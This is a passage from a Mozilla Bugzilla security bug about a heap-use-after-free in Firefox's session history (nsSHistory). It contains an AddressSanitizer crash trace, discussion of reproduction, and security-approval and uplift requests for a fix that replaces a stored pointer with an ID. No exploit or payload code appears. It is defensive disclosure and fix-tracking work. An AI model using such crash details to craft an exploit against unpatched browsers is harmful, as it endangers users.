    #38 0x7fc8c4a6e3a7 in nsBaseAppShell::Run() /builds/worker/checkouts/gecko/widget/nsBaseAppShell.cpp:137:27
    #39 0x7fc8c80b7a97 in nsAppStartup::Run() /builds/worker/checkouts/gecko/toolkit/components/startup/nsAppStartup.cpp:273:30
    #40 0x7fc8c82bade2 in XREMain::XRE_mainRun() /builds/worker/checkouts/gecko/toolkit/xre/nsAppRunner.cpp:5249:22
    #41 0x7fc8c82bcf0c in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/checkouts/gecko/toolkit/xre/nsAppRunner.cpp:5434:8
    #42 0x7fc8c82bdcc3 in XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/checkouts/gecko/toolkit/xre/nsAppRunner.cpp:5493:21
    #43 0x5588e1afad3f in do_main /builds/worker/checkouts/gecko/browser/app/nsBrowserApp.cpp:225:22
    #44 0x5588e1afad3f in main /builds/worker/checkouts/gecko/browser/app/nsBrowserApp.cpp:378:16
    #45 0x7fc8dbe1030f in __libc_start_call_main libc-start.c
    #46 0x7fc8dbe103c0 in __libc_start_main@GLIBC_2.2.5 (/usr/lib/libc.so.6+0x2d3c0)
    #47 0x5588e1a4b6bc in _start (/m-e-20220509165252-asan-opt/firefox+0x566bc)

0x61a000176a80 is located 0 bytes inside of 1288-byte region [0x61a000176a80,0x61a000176f88)
freed by thread T0 here:
    #0 0x5588e1ac64b2 in __interceptor_free /builds/worker/fetches/llvm-project/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cpp:127:3
    #1 0x7fc8bdaaafc5 in SnowWhiteKiller::Visit(nsPurpleBuffer&, nsPurpleBufferEntry*) /builds/worker/checkouts/gecko/xpcom/base/nsCycleCollector.cpp:2451:9
    #2 0x7fc8bda8cd9d in void nsPurpleBuffer::VisitEntries<SnowWhiteKiller>(SnowWhiteKiller&) /builds/worker/checkouts/gecko/xpcom/base/nsCycleCollector.cpp:954:27
    #3 0x7fc8bda8d5ce in nsCycleCollector::FreeSnowWhiteWithBudget(js::SliceBudget&) /builds/worker/checkouts/gecko/xpcom/base/nsCycleCollector.cpp:2619:14
    #4 0x7fc8bf5e8cb3 in AsyncFreeSnowWhite::Run() /builds/worker/checkouts/gecko/js/xpconnect/src/XPCJSRuntime.cpp:146:9
    #5 0x7fc8bdc57a89 in IdleRunnableWrapper::Run() /builds/worker/checkouts/gecko/xpcom/threads/nsThreadUtils.cpp:310:22
    #6 0x7fc8bdc5872a in mozilla::RunnableTask::Run() /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:502:16
    #7 0x7fc8bdc28c4b in mozilla::TaskController::DoExecuteNextTaskOnlyMainThreadInternal(mozilla::detail::BaseAutoLock<mozilla::Mutex&> const&) /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:805:26
    #8 0x7fc8bdc26c2a in mozilla::TaskController::ExecuteNextTaskOnlyMainThreadInternal(mozilla::detail::BaseAutoLock<mozilla::Mutex&> const&) /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:683:15
    #9 0x7fc8bdc2700d in mozilla::TaskController::ProcessPendingMTTask(bool) /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:425:36
    #10 0x7fc8bdc608b1 in operator() /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:135:37
    #11 0x7fc8bdc608b1 in mozilla::detail::RunnableFunction<mozilla::TaskController::InitializeInternal()::$_0>::Run() /builds/worker/checkouts/gecko/xpcom/threads/nsThreadUtils.h:532:5
    #12 0x7fc8bdc41e9f in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/checkouts/gecko/xpcom/threads/nsThread.cpp:1152:16
    #13 0x7fc8bdc4c16c in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/checkouts/gecko/xpcom/threads/nsThreadUtils.cpp:466:10
    #14 0x7fc8becf6bea in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/checkouts/gecko/ipc/glue/MessagePump.cpp:85:21
    #15 0x7fc8bec0c241 in RunInternal /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:331:10
    #16 0x7fc8bec0c241 in RunHandler /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:324:3
    #17 0x7fc8bec0c241 in MessageLoop::Run() /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:306:3
    #18 0x7fc8c4a6e3a7 in nsBaseAppShell::Run() /builds/worker/checkouts/gecko/widget/nsBaseAppShell.cpp:137:27
    #19 0x7fc8c80b7a97 in nsAppStartup::Run() /builds/worker/checkouts/gecko/toolkit/components/startup/nsAppStartup.cpp:273:30
    #20 0x7fc8c82bade2 in XREMain::XRE_mainRun() /builds/worker/checkouts/gecko/toolkit/xre/nsAppRunner.cpp:5249:22
    #21 0x7fc8c82bcf0c in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/checkouts/gecko/toolkit/xre/nsAppRunner.cpp:5434:8
    #22 0x7fc8c82bdcc3 in XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/checkouts/gecko/toolkit/xre/nsAppRunner.cpp:5493:21
    #23 0x5588e1afad3f in do_main /builds/worker/checkouts/gecko/browser/app/nsBrowserApp.cpp:225:22
    #24 0x5588e1afad3f in main /builds/worker/checkouts/gecko/browser/app/nsBrowserApp.cpp:378:16
    #25 0x7fc8dbe1030f in __libc_start_call_main libc-start.c

previously allocated by thread T0 here:
    #0 0x5588e1ac671d in malloc /builds/worker/fetches/llvm-project/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cpp:145:3
    #1 0x5588e1b00a3d in moz_xmalloc /builds/worker/checkouts/gecko/memory/mozalloc/mozalloc.cpp:52:15
    #2 0x7fc8c7782f6b in operator new /builds/worker/workspace/obj-build/dist/include/mozilla/cxxalloc.h:33:10
    #3 0x7fc8c7782f6b in mozilla::dom::BrowsingContext::CreateDetached(nsGlobalWindowInner*, mozilla::dom::BrowsingContext*, mozilla::dom::BrowsingContextGroup*, nsTSubstring<char16_t> const&, mozilla::dom::BrowsingContext::Type, bool) /builds/worker/checkouts/gecko/docshell/base/BrowsingContext.cpp:413:15
    #4 0x7fc8c0b41033 in CreateBrowsingContext(mozilla::dom::Element*, nsIOpenWindowInfo*, mozilla::dom::BrowsingContextGroup*, bool) /builds/worker/checkouts/gecko/dom/base/nsFrameLoader.cpp:349:12
    #5 0x7fc8c0b416a1 in nsFrameLoader::Recreate(mozilla::dom::Element*, mozilla::dom::BrowsingContext*, mozilla::dom::BrowsingContextGroup*, mozilla::dom::RemotenessChangeOptions const&, bool, bool, bool) /builds/worker/checkouts/gecko/dom/base/nsFrameLoader.cpp:499:15
    #6 0x7fc8c0b5f490 in nsFrameLoaderOwner::ChangeRemotenessCommon(nsFrameLoaderOwner::ChangeRemotenessContextType const&, mozilla::dom::RemotenessChangeOptions const&, bool, bool, mozilla::dom::BrowsingContextGroup*, std::function<void ()>&, mozilla::ErrorResult&) /builds/worker/checkouts/gecko/dom/base/nsFrameLoaderOwner.cpp:163:20
    #7 0x7fc8c0b60a49 in nsFrameLoaderOwner::ChangeRemotenessToProcess(mozilla::dom::ContentParent*, mozilla::dom::RemotenessChangeOptions const&, mozilla::dom::BrowsingContextGroup*, mozilla::ErrorResult&) /builds/worker/checkouts/gecko/dom/base/nsFrameLoaderOwner.cpp:284:3
    #8 0x7fc8c77c96ea in mozilla::dom::CanonicalBrowsingContext::PendingRemotenessChange::FinishTopContent() /builds/worker/checkouts/gecko/docshell/base/CanonicalBrowsingContext.cpp:1485:21
    #9 0x7fc8c77c920a in mozilla::dom::CanonicalBrowsingContext::PendingRemotenessChange::Finish() /builds/worker/checkouts/gecko/docshell/base/CanonicalBrowsingContext.cpp:1415:43
    #10 0x7fc8c78a2e73 in operator() /builds/worker/checkouts/gecko/docshell/base/CanonicalBrowsingContext.cpp:1400:45
    #11 0x7fc8c78a2e73 in InvokeMethod<(lambda at /builds/worker/checkouts/gecko/docshell/base/CanonicalBrowsingContext.cpp:1400:9), void ((lambda at /builds/worker/checkouts/gecko/docshell/base/CanonicalBrowsingContext.cpp:1400:9)::*)(bool) const, bool> /builds/worker/workspace/obj-build/dist/include/mozilla/MozPromise.h:630:12
    #12 0x7fc8c78a2e73 in InvokeCallbackMethod<false, (lambda at /builds/worker/checkouts/gecko/docshell/base/CanonicalBrowsingContext.cpp:1400:9), void ((lambda at /builds/worker/checkouts/gecko/docshell/base/CanonicalBrowsingContext.cpp:1400:9)::*)(bool) const, bool, RefPtr<mozilla::MozPromise<bool, nsresult, true>::Private> > /builds/worker/workspace/obj-build/dist/include/mozilla/MozPromise.h:661:5
    #13 0x7fc8c78a2e73 in mozilla::MozPromise<bool, nsresult, true>::ThenValue<mozilla::dom::CanonicalBrowsingContext::PendingRemotenessChange::ProcessReady()::$_34, mozilla::dom::CanonicalBrowsingContext::PendingRemotenessChange::ProcessReady()::$_35>::DoResolveOrRejectInternal(mozilla::MozPromise<bool, nsresult, true>::ResolveOrRejectValue&) /builds/worker/workspace/obj-build/dist/include/mozilla/MozPromise.h:846:9
    #14 0x7fc8becb8153 in mozilla::MozPromise<bool, nsresult, true>::ThenValueBase::ResolveOrRejectRunnable::Run() /builds/worker/workspace/obj-build/dist/include/mozilla/MozPromise.h:487:21
    #15 0x7fc8bdc5872a in mozilla::RunnableTask::Run() /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:502:16
    #16 0x7fc8bdc28c4b in mozilla::TaskController::DoExecuteNextTaskOnlyMainThreadInternal(mozilla::detail::BaseAutoLock<mozilla::Mutex&> const&) /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:805:26
    #17 0x7fc8bdc268f8 in mozilla::TaskController::ExecuteNextTaskOnlyMainThreadInternal(mozilla::detail::BaseAutoLock<mozilla::Mutex&> const&) /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:641:15
    #18 0x7fc8bdc2700d in mozilla::TaskController::ProcessPendingMTTask(bool) /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:425:36
    #19 0x7fc8bdc608b1 in operator() /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:135:37
    #20 0x7fc8bdc608b1 in mozilla::detail::RunnableFunction<mozilla::TaskController::InitializeInternal()::$_0>::Run() /builds/worker/checkouts/gecko/xpcom/threads/nsThreadUtils.h:532:5
    #21 0x7fc8bdc41e9f in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/checkouts/gecko/xpcom/threads/nsThread.cpp:1152:16
    #22 0x7fc8bdc4c16c in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/checkouts/gecko/xpcom/threads/nsThreadUtils.cpp:466:10
    #23 0x7fc8becf6bea in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/checkouts/gecko/ipc/glue/MessagePump.cpp:85:21
    #24 0x7fc8bec0c241 in RunInternal /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:331:10
    #25 0x7fc8bec0c241 in RunHandler /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:324:3
    #26 0x7fc8bec0c241 in MessageLoop::Run() /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:306:3
    #27 0x7fc8c4a6e3a7 in nsBaseAppShell::Run() /builds/worker/checkouts/gecko/widget/nsBaseAppShell.cpp:137:27
    #28 0x7fc8c80b7a97 in nsAppStartup::Run() /builds/worker/checkouts/gecko/toolkit/components/startup/nsAppStartup.cpp:273:30
    #29 0x7fc8c82bade2 in XREMain::XRE_mainRun() /builds/worker/checkouts/gecko/toolkit/xre/nsAppRunner.cpp:5249:22
    #30 0x7fc8c82bcf0c in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/checkouts/gecko/toolkit/xre/nsAppRunner.cpp:5434:8
    #31 0x7fc8c82bdcc3 in XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/checkouts/gecko/toolkit/xre/nsAppRunner.cpp:5493:21
    #32 0x5588e1afad3f in do_main /builds/worker/checkouts/gecko/browser/app/nsBrowserApp.cpp:225:22
    #33 0x5588e1afad3f in main /builds/worker/checkouts/gecko/browser/app/nsBrowserApp.cpp:378:16
    #34 0x7fc8dbe1030f in __libc_start_call_main libc-start.c

SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/obj-build/dist/include/mozilla/RefPtr.h:49:39 in AddRef
Shadow bytes around the buggy address:
  0x0c3480026d00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3480026d10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3480026d20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3480026d30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3480026d40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x0c3480026d50:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3480026d60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3480026d70: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3480026d80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3480026d90: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3480026da0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==78268==ABORTING

```

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1765951#c9)• 3 years ago |
|  | |

I can reproduce that on the ESR build but not on a nightly ASAN build. All the other issues talk about XSLT, but this looks like a different situation. I'm going to move the XSLT issues to a separate bug, I could only ever trigger a null-crash with those.

|  | [Armin Ebert [:arminius]](/user_profile?user_id=526160)  Reporter |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1765951#c10)• 3 years ago |
|  | |

(In reply to Peter Van der Beken [:peterv] from [comment #9](/show_bug.cgi?id=1765951#c9 "VERIFIED FIXED - heap-use-after-free in nsSHistory"))

> All the other issues talk about XSLT, but this looks like a different situation.

Yes, you're totally right. I had conflated two separate bugs here - sorry for the confusion! Curiously, the crashing XSLT pages were what primed my session history to trigger the UAF, so I had initially assumed the bugs were related.

> I'm going to move the XSLT issues to a separate bug, I could only ever trigger a null-crash with those.

I went ahead and filed [bug 1769155](/show_bug.cgi?id=1769155 "RESOLVED FIXED - XSLT error handler may set up error document in incorrect context") with the CC list from here - hope it makes sense this way. Since I can't edit my own bugs/comments, I won't be able to clean this one up though.

|  | [Armin Ebert [:arminius]](/user_profile?user_id=526160)  Reporter |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1765951#c11)• 3 years ago |
|  | |

(In reply to Peter Van der Beken [:peterv] from [comment #9](/show_bug.cgi?id=1765951#c9 "VERIFIED FIXED - heap-use-after-free in nsSHistory"))

> I can reproduce that on the ESR build but not on a nightly ASAN build.

With the steps from [comment 8](/show_bug.cgi?id=1765951#c8 "VERIFIED FIXED - heap-use-after-free in nsSHistory"), I got the UAF reported on

* current ESR (`m-e-20220516145129-asan-opt`)
* current release with fission disabled (`m-r-20220516184602-asan-opt`)
* nightly with fission disabled <= `m-c-20220419034149-asan-opt`.

It did not trigger in ASAN nightly builds from 2022-04-20 onwards.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1765951#a2282329_1689)• 3 years ago |

See Also: → [CVE-2022-38472](/show_bug.cgi?id=1769155 "RESOLVED FIXED - XSLT error handler may set up error document in incorrect context")

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1765951#a2282645_1689)• 3 years ago |

Has STR: --- → yesKeywords: [testcase-wanted](/buglist.cgi?keywords=testcase-wanted&resolution=---) → [sec-high](/buglist.cgi?keywords=sec-high&resolution=---)Whiteboard: STR in comment 8

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1765951#c12)• 3 years ago |
|  | |

Comment on [attachment 9276277](/attachment.cgi?id=9276277 "Bug 1765951 - Stop storing BC pointer in nsSHistory. r?smaug!") [[details]](/attachment.cgi?id=9276277&action=edit "Bug 1765951 - Stop storing BC pointer in nsSHistory. r?smaug!")

[Bug 1765951](/show_bug.cgi?id=1765951 "VERIFIED FIXED - heap-use-after-free in nsSHistory") - Stop storing BC pointer in nsSHistory. r?smaug!

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: Not very easily I think.
* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: No
* **Which older supported branches are affected by this flaw?**: All
* **If not all supported branches, which bug introduced the flaw?**: None
* **Do you have backports for the affected branches?**: Yes
* **If not, how different, hard to create, and risky will they be?**:
* **How likely is this patch to cause regressions; how much testing does it need?**: Shouldn't cause regressions, just stops us from crashing with UAF under certain conditions.
* **Is Android affected?**: Yes
Flags: needinfo?(peterv)
[Attachment #9276277](/attachment.cgi?id=9276277&action=edit "Bug 1765951 - Stop storing BC pointer in nsSHistory. r?smaug!") -
Flags: sec-approval?

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1765951#c13)• 3 years ago |
|  | |

The patch does seem to fix the issue for me on an ESR asan build. I tried making an automated testcase, but no luck so far.

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1765951#c14)• 3 years ago |
|  | |

Comment on [attachment 9276277](/attachment.cgi?id=9276277 "Bug 1765951 - Stop storing BC pointer in nsSHistory. r?smaug!") [[details]](/attachment.cgi?id=9276277&action=edit "Bug 1765951 - Stop storing BC pointer in nsSHistory. r?smaug!")

[Bug 1765951](/show_bug.cgi?id=1765951 "VERIFIED FIXED - heap-use-after-free in nsSHistory") - Stop storing BC pointer in nsSHistory. r?smaug!

approved to land and uplift

[Attachment #9276277](/attachment.cgi?id=9276277&action=edit "Bug 1765951 - Stop storing BC pointer in nsSHistory. r?smaug!") -
Flags: sec-approval? → sec-approval+

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1765951#a3912417_406194)• 3 years ago |

Severity: -- → S2Priority: -- → P2

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1765951#c15)• 3 years ago |
|  | |

Stop storing BC pointer in nsSHistory. r=smaug

<https://hg.mozilla.org/integration/autoland/rev/09141d52eefdf0b23a7247fa943cb93c0f183212>

<https://hg.mozilla.org/mozilla-central/rev/09141d52eefd>

Group: dom-core-security → core-security-releaseStatus: ASSIGNED → RESOLVEDClosed: 3 years ago
[status-firefox103](/buglist.cgi?f1=cf_status_firefox103&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox103&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → 103 Branch

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1765951#a4076087_406194)• 3 years ago |

[status-firefox101](/buglist.cgi?f1=cf_status_firefox101&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox101&o1=equals&v1=wontfix)
[status-firefox102](/buglist.cgi?f1=cf_status_firefox102&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox102&o1=equals&v1=affected)
[status-firefox-esr102](/buglist.cgi?f1=cf_status_firefox_esr102&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=affected)
[status-firefox-esr91](/buglist.cgi?f1=cf_status_firefox_esr91&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr91&o1=equals&v1=affected)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1765951#c16)• 3 years ago |
|  | |

This'll need a rebased patch for ESR91. Please attach that and request approval when you get a chance. Beta grafts cleanly as-landed.

[status-firefox-esr102](/buglist.cgi?f1=cf_status_firefox_esr102&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=affected) → ---
[tracking-firefox102](/buglist.cgi?f1=cf_tracking_firefox102&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox102&o1=equals&v1=%2B)
[tracking-firefox103](/buglist.cgi?f1=cf_tracking_firefox103&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox103&o1=equals&v1=%2B)
[tracking-firefox-esr91](/buglist.cgi?f1=cf_tracking_firefox_esr91&o1=isnotempty):
--- → [102+](/buglist.cgi?f1=cf_tracking_firefox_esr91&o1=equals&v1=102%2B)Flags: needinfo?(peterv)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1765951#c17)• 3 years ago |
|  | |

Attached file
[Bug 1765951 - Stop storing BC pointer in nsSHistory. r=smaug](attachment.cgi?id=9280409)
— [Details](attachment.cgi?id=9280409&action=edit)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1765951#c18)• 3 years ago |
|  | |

Comment on [attachment 9276277](/attachment.cgi?id=9276277 "Bug 1765951 - Stop storing BC pointer in nsSHistory. r?smaug!") [[details]](/attachment.cgi?id=9276277&action=edit "Bug 1765951 - Stop storing BC pointer in nsSHistory. r?smaug!")

[Bug 1765951](/show_bug.cgi?id=1765951 "VERIFIED FIXED - heap-use-after-free in nsSHistory") - Stop storing BC pointer in nsSHistory. r?smaug!

### Beta/Release Uplift Approval Request

* **User impact if declined**: UAF
* **Is this code covered by automated tests?**: Yes
* **Has the fix been verified in Nightly?**: No
* **Needs manual test from QE?**: No
* **If yes, steps to reproduce**:
* **List of other uplifts needed**: None
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: Patch uses an ID to keep track of a BrowsingContext, instead of a pointer. When accessing the BC we now check if it's available in the process first, instead of using the pointer (which might be pointing to a freed object).
* **String changes made/needed**:
* **Is Android affected?**: Yes
Flags: needinfo?(peterv)
[Attachment #9276277](/attachment.cgi?id=9276277&action=edit "Bug 1765951 - Stop storing BC pointer in nsSHistory. r?smaug!") -
Flags: approval-mozilla-beta?

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1765951#a4142412_24295)• 3 years ago |

[Attachment #9280409](/attachment.cgi?id=9280409&action=edit "Bug 1765951 - Stop storing BC pointer in nsSHistory. r=smaug") -
Flags: approval-mozilla-beta?

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1765951#c19)• 3 years ago |
|  | |

Comment on [attachment 9280409](/attachment.cgi?id=9280409 "Bug 1765951 - Stop storing BC pointer in nsSHistory. r=smaug") [[details]](/attachment.cgi?id=9280409&action=edit "Bug 1765951 - Stop storing BC pointer in nsSHistory. r=smaug")

[Bug 1765951](/show_bug.cgi?id=1765951 "VERIFIED FIXED - heap-use-after-free in nsSHistory") - Stop storing BC pointer in nsSHistory. r=smaug

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**:
* **User impact if declined**: UAF
* **Fix Landed on Version**: 103
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: See approval-mozilla-beta request on [attachment 9276277](/attachment.cgi?id=9276277 "Bug 1765951 - Stop storing BC pointer in nsSHistory. r?smaug!") [[details]](/attachment.cgi?id=9276277&action=edit "Bug 1765951 - Stop storing BC pointer in nsSHistory. r?smaug!").
[Attachment #9280409](/attachment.cgi?id=9280409&action=edit "Bug 1765951 - Stop storing BC pointer in nsSHistory. r=smaug") -
Flags: approval-mozilla-beta? → approval-mozilla-esr102?

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1765951#c20)• 3 years ago |
|  | |

Comment on [attachment 9280409](/attachment.cgi?id=9280409 "Bug 1765951 - Stop storing BC pointer in nsSHistory. r=smaug") [[details]](/attachment.cgi?id=9280409&action=edit "Bug 1765951 - Stop storing BC pointer in nsSHistory. r=smaug")

[Bug 1765951](/show_bug.cgi?id=1765951 "VERIFIED FIXED - heap-use-after-free in nsSHistory") - Stop storing BC pointer in nsSHistory. r=smaug

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**:
* **User impact if declined**:
* **Fix Landed on Version**:
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**:
[Attachment #9280409](/attachment.cgi?id=9280409&action=edit "Bug 1765951 - Stop storing BC pointer in nsSHistory. r=smaug") -
Flags: approval-mozilla-esr91?

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1765951#a4143316_24295)• 3 years ago |

[Attachment #9280409](/attachment.cgi?id=9280409&action=edit "Bug 1765951 - Stop storing BC pointer in nsSHistory. r=smaug") -
Flags: approval-mozilla-esr102?

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1765951#c21)• 3 years ago |
|  | |

Comment on [attachment 9276277](/attachment.cgi?id=9276277 "Bug 1765951 - Stop storing BC pointer in nsSHistory. r?smaug!") [[details]](/attachment.cgi?id=9276277&action=edit "Bug 1765951 - Stop storing BC pointer in nsSHistory. r?smaug!")

[Bug 1765951](/show_bug.cgi?id=1765951 "VERIFIED FIXED - heap-use-after-free in nsSHistory") - Stop storing BC pointer in nsSHistory. r?smaug!

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**:
* **User impact if declined**:
* **Fix Landed on Version**:
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**:
[Attachment #9276277](/attachment.cgi?id=9276277&action=edit "Bug 1765951 - Stop storing BC pointer in nsSHistory. r?smaug!") -
Flags: approval-mozilla-esr102?

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1765951#c22)• 3 years ago |
|  | |

Comment on [attachment 9276277](/attachment.cgi?id=9276277 "Bug 1765951 - Stop storing BC pointer in nsSHistory. r?smaug!") [[details]](/attachment.cgi?id=9276277&action=edit "Bug 1765951 - Stop storing BC pointer in nsSHistory. r?smaug!")

[Bug 1765951](/show_bug.cgi?id=1765951 "VERIFIED FIXED - heap-use-after-free in nsSHistory") - Stop storing BC pointer in nsSHistory. r?smaug!

Approved for 102 beta 6, thanks.

[Attachment #9276277](/attachment.cgi?id=9276277&action=edit "Bug 1765951 - Stop storing BC pointer in nsSHistory. r?smaug!") -
Flags: approval-mozilla-beta? → approval-mozilla-beta+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1765951#a4163255_75935)• 3 years ago |

[Attachment #9276277](/attachment.cgi?id=9276277&action=edit "Bug 1765951 - Stop storing BC pointer in nsSHistory. r?smaug!") -
Flags: approval-mozilla-esr102?

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1765951#c23)• 3 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/32919d541b0c>

[status-firefox102](/buglist.cgi?f1=cf_status_firefox102&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox102&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox102&o1=equals&v1=fixed)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1765951#c24)• 3 years ago |
|  | |

Comment on [attachment 9280409](/attachment.cgi?id=9280409 "Bug 1765951 - Stop storing BC pointer in nsSHistory. r=smaug") [[details]](/attachment.cgi?id=9280409&action=edit "Bug 1765951 - Stop storing BC pointer in nsSHistory. r=smaug")

[Bug 1765951](/show_bug.cgi?id=1765951 "VERIFIED FIXED - heap-use-after-free in nsSHistory") - Stop storing BC pointer in nsSHistory. r=smaug

Approved for 91.11esr.

[Attachment #9280409](/attachment.cgi?id=9280409&action=edit "Bug 1765951 - Stop storing BC pointer in nsSHistory. r=smaug") -
Flags: approval-mozilla-esr91? → approval-mozilla-esr91+

